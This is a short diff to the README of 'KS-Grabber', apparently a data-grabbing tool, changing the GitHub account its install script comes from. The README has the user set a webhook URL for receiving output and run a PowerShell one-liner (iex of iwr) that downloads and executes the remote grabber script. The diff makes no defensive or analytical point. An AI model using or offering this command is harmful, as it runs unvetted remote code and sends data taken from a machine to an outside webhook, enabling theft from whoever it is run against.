@@ -16,7 +16,7 @@ Run the following command in PowerShell to execute KS-Grabber:
 
 ```powershell
 $hookurl = '<webhook goes here>'
-iex (iwr https://raw.githubusercontent.com/Niximkk/ks-grabber/main/ks-grabber.ps1).content
+iex (iwr https://raw.githubusercontent.com/Hosseios/ks-grabber/main/ks-grabber.ps1).content
 ```
 
 ## Configuration
